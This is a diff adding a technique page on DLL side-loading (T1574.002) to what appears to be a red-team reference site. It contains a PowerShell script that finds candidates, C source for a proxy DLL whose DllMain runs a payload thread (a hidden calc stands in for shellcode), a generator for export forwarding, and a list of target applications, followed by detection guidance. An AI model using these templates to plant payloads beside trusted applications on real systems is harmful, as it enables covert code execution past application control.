@@ -1,0 +1,224 @@
+---
+title: DLL Side-Loading
+mitre: T1574.002
+category: injection
+group: DLL Abuse
+summary: Drop a malicious DLL beside a legitimate signed application that loads it by relative path, inheriting the application's trust and execution context.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: identify a vulnerable signed application
+    desc: Find a signed EXE that loads a DLL by unqualified name — the DLL does not exist in System32, only in the application's own directory.
+    dll: —
+  - call: craft a malicious proxy DLL
+    desc: Build a DLL that exports all symbols the host application expects (forwarded to the real DLL) and runs the payload in DllMain.
+    dll: —
+  - call: place the malicious DLL in the application directory
+    desc: Drop the DLL in the same directory as the legitimate EXE so the DLL search order finds it first.
+    dll: —
+  - call: execute the legitimate application
+    desc: The signed EXE loads the malicious DLL, bypassing application whitelisting that only checks the EXE's signature.
+    dll: —
+detections:
+  - src: SYSMON EID 7
+    text: A signed process loading an unsigned DLL from its own directory — the DLL hash does not match the expected vendor DLL.
+  - src: SYSMON EID 1
+    text: The legitimate signed EXE spawning child processes or making network connections it never makes in normal use.
+  - src: FILE INTEGRITY
+    text: A DLL appears in an application directory with a name matching a known side-loadable DLL but a different hash.
+  - src: BEHAVIOURAL
+    text: Application (e.g. Teams, Zoom, OneDrive updater) connecting to non-vendor C2 infrastructure.
+related:
+  - mitre: T1574.001
+    title: DLL Hijacking (Search Order)
+    desc: Broader category — side-loading is a specific subtype where the DLL is placed in the application directory.
+    href: /techniques/persistence/dll-hijacking
+  - mitre: T1036.005
+    title: Masquerading
+    desc: Name the side-loaded DLL to match the legitimate one so process listings look normal.
+  - mitre: T1218
+    title: Signed Binary Proxy Execution
+    desc: LOLBin alternative — use built-in signed binaries to execute payloads.
+labKit:
+  - label: side-load-finder.ps1
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+DLL side-loading is a refined form of DLL hijacking that specifically targets the pattern where a signed, trusted application loads a DLL from its own installation directory by unqualified name. Because the application is signed and trusted, many application-control products (AppLocker, WDAC) allow it to execute — and any DLL it loads inherits that execution context without requiring an independent signature.
+
+The attack model is: find a legitimate application that loads `example.dll` from its own folder; the real `example.dll` is in System32 or does not exist at all. Drop a malicious `example.dll` in the application's folder. Run the application. The malicious DLL executes under the cover of the trusted application.
+
+Well-known historical examples include `OneDriveSetup.exe` loading `vcruntime140.dll`, various Adobe products loading unsigned DLLs, and numerous EDR vendor processes loading helper DLLs from their installation directory.
+
+<Callout type="note">
+  Side-loading differs from classic DLL hijacking in that the targeted DLL is expected to be
+  in the application's own directory — the attacker is not racing the search order across multiple
+  paths. This makes it more reliable (the DLL is always found first) and more portable (works
+  regardless of whether the real DLL exists elsewhere on the system).
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Discover side-loadable candidates
+
+<CodeBlock
+  file="find_sideload.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Monitor DLL load failures with Procmon or use this offline approach:
+# Find signed EXEs in Program Files that load DLLs not in System32
+
+$system32 = Get-ChildItem "$env:SystemRoot\System32\*.dll" |
+    Select-Object -ExpandProperty Name
+
+Get-ChildItem "C:\Program Files\*\*.exe" -Recurse |
+    Where-Object { (Get-AuthenticodeSignature $_).Status -eq "Valid" } |
+    ForEach-Object {
+        $exe = $_
+        try {
+            $imports = [System.Reflection.Assembly]::LoadFile($exe.FullName)
+        } catch {}
+
+        # Use Dependency Walker output or PE header parsing
+        # For demo: list DLLs in same dir as the EXE
+        $same_dir = Get-ChildItem $exe.DirectoryName -Filter "*.dll" |
+            Where-Object { $system32 -notcontains $_.Name }
+
+        foreach ($dll in $same_dir) {
+            [PSCustomObject]@{
+                Exe    = $exe.Name
+                Dll    = $dll.Name
+                Signed = (Get-AuthenticodeSignature $dll.FullName).Status
+            }
+        }
+    } | Where-Object { $_.Signed -ne "Valid" }`}
+/>
+
+### Proxy DLL — forwards all exports to the real DLL
+
+<CodeBlock
+  file="proxy_dll.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// proxy_version.dll — forwards exports to the real version.dll in System32
+// while running a payload in DllMain
+//
+// Compile: cl /LD proxy_version.dll.c /link /DEF:version.def
+// version.def lists all exports with NONAME forwarding to version_real.dll
+
+#include <windows.h>
+
+// Payload: run in a new thread to avoid blocking DllMain
+static DWORD WINAPI payload_thread(LPVOID) {
+    // Shellcode execution, beacon start, etc.
+    // Example: spawn a hidden calc as a visible indicator
+    STARTUPINFOA si = { .cb = sizeof si, .dwFlags = STARTF_USESHOWWINDOW,
+                        .wShowWindow = SW_HIDE };
+    PROCESS_INFORMATION pi = {0};
+    CreateProcessA(NULL, "cmd.exe /c calc.exe", NULL, NULL, FALSE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hDll);
+
+        // Forward all version.dll exports to the real DLL in System32
+        // (handled by the .def file linker directives below)
+
+        // Run payload asynchronously
+        HANDLE t = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
+        if (t) CloseHandle(t);
+    }
+    return TRUE;
+}
+
+// version.def content (embedded as comment for reference):
+// EXPORTS
+//   GetFileVersionInfoA  = version_real.GetFileVersionInfoA
+//   GetFileVersionInfoW  = version_real.GetFileVersionInfoW
+//   VerQueryValueA       = version_real.VerQueryValueA
+//   VerQueryValueW       = version_real.VerQueryValueW
+//   ... (all exports forwarded)`}
+/>
+
+### Automated export forwarding with a .def file generator
+
+<CodeBlock
+  file="gen_def.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`#!/usr/bin/env python3
+"""
+Generate a .def file that forwards all exports from a target DLL
+to a renamed copy (target_real.dll), enabling transparent proxy DLL.
+"""
+import pefile, sys
+
+def gen_def(dll_path, real_dll_name, out_def):
+    pe = pefile.PE(dll_path)
+    exports = []
+
+    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
+        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
+            if exp.name:
+                name = exp.name.decode()
+                exports.append(f"    {name}={real_dll_name}.{name}")
+
+    with open(out_def, 'w') as f:
+        f.write("EXPORTS\n")
+        f.write("\n".join(exports))
+        f.write("\n")
+
+    print(f"[+] Generated {len(exports)} forwarded exports in {out_def}")
+
+if __name__ == '__main__':
+    gen_def(sys.argv[1], sys.argv[2], sys.argv[3])
+    # Usage: python3 gen_def.py C:\Windows\System32\version.dll version_real version.def`}
+/>
+
+## High-value side-load targets (examples)
+
+| Application | Vulnerable DLL | Notes |
+|---|---|---|
+| Various Adobe products | `dwmapi.dll` | Loads from app dir, not System32 |
+| Windows Update client | `wuapi.dll` variant | Version-specific behaviour |
+| OneDrive setup | `vcruntime140.dll` variant | Depends on VS runtime deployment |
+| Zoom | `msvcp140.dll` variant | Shipping older runtimes |
+| Teams | `dbghelp.dll` | Loads from install dir |
+| Process Monitor (ironic) | `pla.dll` | Sysinternals tools |
+
+The specific vulnerable configurations change with application versions. Always verify against the target version using Procmon's DLL load failure events.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The key signal is a signed process loading an unsigned or unexpected DLL from its own directory. File integrity monitoring on application directories (Tripwire, Wazuh FIM, Sysmon EID 11 + 7 correlation) will catch DLL drops before execution. After execution, Sysmon EID 7 with `Signed: false` from a process whose EXE is signed is a high-confidence indicator.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
